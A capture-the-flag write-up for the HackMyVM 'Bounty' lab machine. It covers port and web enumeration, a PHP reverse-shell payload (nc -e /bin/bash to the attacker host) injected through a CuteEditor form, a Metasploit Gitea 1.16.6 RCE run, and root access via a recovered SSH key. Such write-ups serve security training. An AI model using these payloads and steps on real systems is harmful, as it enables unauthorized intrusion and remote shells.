---
layout: post
title: "HackMyVM - Bounty"
date: 2023-04-13 00:00:00 +0100
categories: hmv
tag: ["CuteEditor", "RCE", "Gitea"]
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: Medium
Release Date: 2022-10-25

## Scan

```bash
$ nmap -sC -sV -oA scans/Bounty -p- 192.168.1.106
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 15:39 WET
Nmap scan report for 192.168.1.106
Host is up (0.00030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 7585675677e85ad8f049c55d7339c816 (RSA)
|   256 b55dd87ec9ade6677d5ee3abb0a0faf3 (ECDSA)
|_  256 dd11b9f8fdb6a59fd8d640c7db816367 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds
```

## Enumeration

### Page Source

```bash
$ curl http://192.168.1.106                                   
* * * * * /usr/bin/php /var/www/html/document.html
```

### Gobuster 

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.106 -x php,html,txt -o scans/gobuster-medium.log
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.106
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/03/25 15:41:34 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 51]
/index.php            (Status: 200) [Size: 470]
/templates.php        (Status: 200) [Size: 5920]
/document             (Status: 301) [Size: 169] [--> http://192.168.1.106/document/]
/document.html        (Status: 200) [Size: 23]
/Templates            (Status: 301) [Size: 169] [--> http://192.168.1.106/Templates/]
/Uploads              (Status: 301) [Size: 169] [--> http://192.168.1.106/Uploads/]
/localization.php     (Status: 200) [Size: 3444]
Progress: 880993 / 882244 (99.86%)
===============================================================
2023/03/25 15:44:30 Finished
===============================================================
```

### Nikto 

```bash
$ nikto -h http://192.168.1.106/ -C all -output scans/nikto-192.168.1.15.html -Format HTML
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.106
+ Target Hostname:    192.168.1.106
+ Target Port:        80
+ Start Time:         2023-03-25 15:58:11 (GMT0)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index.php?: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ Multiple index files found: /default.htm, /index.html, /index.php.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 26640 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-03-25 15:59:08 (GMT0) (57 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Exploit CuteEditor.PHP 

* Get POST request for "Edit Static HTML"

<img src="https://drive.google.com/uc?id=1yXj3US51UMVBCo77d3vAw8FJCeg___K7"/>

<img src="https://drive.google.com/uc?id=1alGckkyE-qLocNV2ORz0YG5sAaQOAvCC"/>

<img src="https://drive.google.com/uc?id=1RPlL_wrmTb-XNiGdbj17fLSyAVNW9kZh"/>

### Send POST request to Burpsuite

<img src="https://drive.google.com/uc?id=1ATfjcnsOAC0haJTG6zg70k_-6BY1j7vq"/>

* Payload

<img src="https://drive.google.com/uc?id=1SeIUsvIIflxvqw3ima7Keb2FIAVhvDTD"/>

* Reverse Shell POST Request

```http
POST /Edithtml.php?postback=true HTTP/1.1
Host: 192.168.1.106
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Origin: http://192.168.1.106
Connection: close
Referer: http://192.168.1.106/Edithtml.php
Cookie: PHPSESSID=kudnjhqsi2bhk2rbi3gmvu8l8p
Upgrade-Insecure-Requests: 1

Editor1=<?php+system('nc+-e+/bin/bash+192.168.1.6+4444');?>&Editor1ClientState=&Save.x=9&Save.y=6&textbox1=%3C%3Fphp%2Bsystem%28%27nc+-e+%2Fbin%2Fbash+192.168.1.6+4444%27%29%3B%3F%3E++++++++++++
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.106] 48098
id
uid=1000(hania) gid=1000(hania) grupos=1000(hania),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Lateral Movement (hania > primavera)

```
hania@bounty:~$ sudo -l
sudo -l
Matching Defaults entries for hania on bounty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hania may run the following commands on bounty:
    (primavera) NOPASSWD: /home/primavera/gitea \"\"
hania@bounty:~$
```

* Launch GITEA service

```bash
hania@bounty:~$ cd ../primavera 
cd ../primavera

hania@bounty:/home/primavera$ sudo -u primavera ./gitea
sudo -u primavera ./gitea

2023/03/25 17:34:04 cmd/web.go:102:runWeb() [I] Starting Gitea on PID: 923
2023/03/25 17:34:04 cmd/web.go:150:runWeb() [I] Global init
2023/03/25 17:34:04 routers/init.go:107:GlobalInitInstalled() [I] Git Version: 2.30.2, Wire Protocol Version 2 Enabled
2023/03/25 17:34:04 routers/init.go:110:GlobalInitInstalled() [I] AppPath: /home/primavera/gitea
2023/03/25 17:34:04 routers/init.go:111:GlobalInitInstalled() [I] AppWorkPath: /home/primavera
2023/03/25 17:34:04 routers/init.go:112:GlobalInitInstalled() [I] Custom path: /home/primavera/custom
2023/03/25 17:34:04 routers/init.go:113:GlobalInitInstalled() [I] Log path: /home/primavera/log
2023/03/25 17:34:04 routers/init.go:114:GlobalInitInstalled() [I] Configuration file: /home/primavera/custom/conf/app.ini
2023/03/25 17:34:04 routers/init.go:115:GlobalInitInstalled() [I] Run Mode: Prod
2023/03/25 17:34:04 ...dules/setting/log.go:287:newLogService() [I] Gitea v1.16.6 built with GNU Make 4.1, go1.18.1 : bindata, sqlite, sqlite_unlock_notify
2023/03/25 17:34:04 ...dules/setting/log.go:334:newLogService() [I] Gitea Log Mode: Console(Console:)
2023/03/25 17:34:04 ...dules/setting/log.go:250:generateNamedLogger() [I] Router Log: Console(console:)
2023/03/25 17:34:04 ...les/setting/cache.go:78:newCacheService() [I] Cache Service Enabled
2023/03/25 17:34:04 ...les/setting/cache.go:93:newCacheService() [I] Last Commit Cache Service Enabled
2023/03/25 17:34:04 ...s/setting/session.go:75:newSessionService() [I] Session Service Enabled
2023/03/25 17:34:04 ...s/storage/storage.go:171:initAttachments() [I] Initialising Attachment storage with type: 
2023/03/25 17:34:04 ...les/storage/local.go:46:NewLocalStorage() [I] Creating new Local Storage at /home/primavera/data/attachments
2023/03/25 17:34:04 ...s/storage/storage.go:165:initAvatars() [I] Initialising Avatar storage with type: 
2023/03/25 17:34:04 ...les/storage/local.go:46:NewLocalStorage() [I] Creating new Local Storage at /home/primavera/data/avatars
2023/03/25 17:34:04 ...s/storage/storage.go:183:initRepoAvatars() [I] Initialising Repository Avatar storage with type: 
2023/03/25 17:34:04 ...les/storage/local.go:46:NewLocalStorage() [I] Creating new Local Storage at /home/primavera/data/repo-avatars
2023/03/25 17:34:04 ...s/storage/storage.go:177:initLFS() [I] Initialising LFS storage with type: 
2023/03/25 17:34:04 ...les/storage/local.go:46:NewLocalStorage() [I] Creating new Local Storage at /home/primavera/data/lfs
2023/03/25 17:34:04 ...s/storage/storage.go:189:initRepoArchives() [I] Initialising Repository Archive storage with type: 
2023/03/25 17:34:04 ...les/storage/local.go:46:NewLocalStorage() [I] Creating new Local Storage at /home/primavera/data/repo-archive
2023/03/25 17:34:04 routers/init.go:131:GlobalInitInstalled() [I] SQLite3 support is enabled
2023/03/25 17:34:04 routers/common/db.go:20:InitDBEngine() [I] Beginning ORM engine initialization.
2023/03/25 17:34:04 routers/common/db.go:27:InitDBEngine() [I] ORM engine initialization attempt #1/10...
2023/03/25 17:34:04 cmd/web.go:153:runWeb() [I] PING DATABASE mysql
2023/03/25 17:34:05 cmd/web.go:153:runWeb() [W] Table project column board_type db type is INT(10) UNSIGNED, struct type is INT UNSIGNED
2023/03/25 17:34:05 cmd/web.go:153:runWeb() [W] Table project column type db type is INT(10) UNSIGNED, struct type is INT UNSIGNED
2023/03/25 17:34:05 routers/init.go:137:GlobalInitInstalled() [I] ORM engine initialization successful!
2023/03/25 17:34:05 ...er/issues/indexer.go:144:func2() [I] PID 923: Initializing Issue Indexer: bleve
2023/03/25 17:34:05 ...xer/stats/indexer.go:39:populateRepoIndexer() [I] Populating the repo stats indexer with existing repositories
2023/03/25 17:34:05 ...er/issues/indexer.go:223:func3() [I] Issue Indexer Initialization took 363.036901ms
2023/03/25 17:34:05 cmd/web.go:208:listen() [I] Listen: http://0.0.0.0:3000
2023/03/25 17:34:05 cmd/web.go:212:listen() [I] AppURL(ROOT_URL): http://bounty:3000/
2023/03/25 17:34:05 cmd/web.go:215:listen() [I] LFS server enabled
2023/03/25 17:34:05 ...s/graceful/server.go:61:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 923
2023/03/25 17:34:22 Started GET / for 192.168.1.6:39432
2023/03/25 17:34:22 Completed GET / 200 OK in 6.949278ms
2023/03/25 17:34:22 Started GET /assets/css/index.css?v=7e6e145c0ebc112485ff39e380b62835 for 192.168.1.6:39432
2023/03/25 17:34:22 Completed GET /assets/css/index.css?v=7e6e145c0ebc112485ff39e380b62835 200 OK in 2.138688ms
2023/03/25 17:34:22 Started GET /assets/js/index.js?v=7e6e145c0ebc112485ff39e380b62835 for 192.168.1.6:39432
2023/03/25 17:34:22 Completed GET /assets/js/index.js?v=7e6e145c0ebc112485ff39e380b62835 200 OK in 3.685226ms
2023/03/25 17:34:22 Started GET /assets/css/theme-auto.css?v=7e6e145c0ebc112485ff39e380b62835 for 192.168.1.6:39446
2023/03/25 17:34:22 Completed GET /assets/css/theme-auto.css?v=7e6e145c0ebc112485ff39e380b62835 200 OK in 185.673µs
2023/03/25 17:34:22 Started GET /assets/img/logo.svg for 192.168.1.6:39432
2023/03/25 17:34:22 Completed GET /assets/img/logo.svg 200 OK in 250.095µs
```

* Register account

<img src="https://drive.google.com/uc?id=1U7emFzgVAa8Y8aRL0eC6o6dtVdpIzjtZ"/>

Credentials : adok : 1q2w3e

### [Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit)](https://www.exploit-db.com/exploits/51009)

```bash
$ msfconsole -q                                                
msf6 > search gitea

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/multi/http/gitea_git_fetch_rce  2022-05-16       excellent  Yes    Gitea Git Fetch Remote Code Execution
   1  exploit/multi/http/gitea_git_hooks_rce  2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
   2  exploit/multi/http/gogs_git_hooks_rce   2020-10-07       excellent  Yes    Gogs Git Hooks Remote Code Execution


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/gogs_git_hooks_rce

msf6 > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp

msf6 exploit(multi/http/gitea_git_fetch_rce) > set PASSWORD 1q2w3e
PASSWORD => 1q2w3e

msf6 exploit(multi/http/gitea_git_fetch_rce) > set RHOSTS 192.168.1.106
RHOSTS => 192.168.1.106

msf6 exploit(multi/http/gitea_git_fetch_rce) > set SRVHOST 192.168.1.6
SRVHOST => 192.168.1.6

msf6 exploit(multi/http/gitea_git_fetch_rce) > set USERNAME adok
USERNAME => adok

msf6 exploit(multi/http/gitea_git_fetch_rce) > set LHOST 192.168.1.6
LHOST => 192.168.1.6

msf6 exploit(multi/http/gitea_git_fetch_rce) > set TARGET 0
TARGET => 0

msf6 exploit(multi/http/gitea_git_fetch_rce) > show options

Module options (exploit/multi/http/gitea_git_fetch_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   1q2w3e           yes       Password to use
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.106    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      3000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to the gitea application
   URIPATH    /                no        The URI to use for this exploit
   USERNAME   adok             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.168.1.6      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all add
                                       resses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.6      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix Command



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/gitea_git_fetch_rce) > 
```

**TARGET: Unix Command (0)**

```
msf6 exploit(multi/http/gitea_git_fetch_rce) > run

[*] Started reverse TCP handler on 192.168.1.6:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6
[*] Using URL: http://192.168.1.6:8080/
[*] Command shell session 1 opened (192.168.1.6:4444 -> 192.168.1.106:36596) at 2023-03-25 16:44:27 +0000
[*] Server stopped.

id
uid=1001(primavera) gid=1001(primavera) groups=1001(primavera)
cd /home/primavera
cat note.txt
Im the shadow admin. Congrats.
```

```
primavera@bounty:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAyPZ0KhVy+/9TsUbalqHuaWsFgC/hjjhR3qu4iZoOZacOXoEtSI3v
bo1bv++uqPXEYgqnuBg5y7mMDtH7dc8w6T6VRfMd7Qc+yUso0Wx8QeK/2JP96UDOxPvVJj
............
eXdNT9UYH4ATc74YNodPW4vRtYOd93Ub+xPfCfk4iET9ObsaCvhTNMLihMgNGI5VWF91f1
t2f4azaitcAue8vgOQXk9I89BZ4t5NQA0fHAsxr1k6z/oe/MjJwBjImd80/il5AkLcb/of
a2F3ZZuMCjBrEAAAAQcHJpbWF2ZXJhQGJvdW50eQECAw==
-----END OPENSSH PRIVATE KEY-----
primavera@bounty:~/.ssh$ 
```

## ROOT

```bash
$ chmod 600 id_rsa                

$ ssh -i id_rsa root@192.168.1.106
Linux bounty 5.10.0-19-amd64 #1 SMP Debian 5.10.149-1 (2022-10-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct 20 11:55:16 2022
root@bounty:~# id
uid=0(root) gid=0(root) grupos=0(root)
```
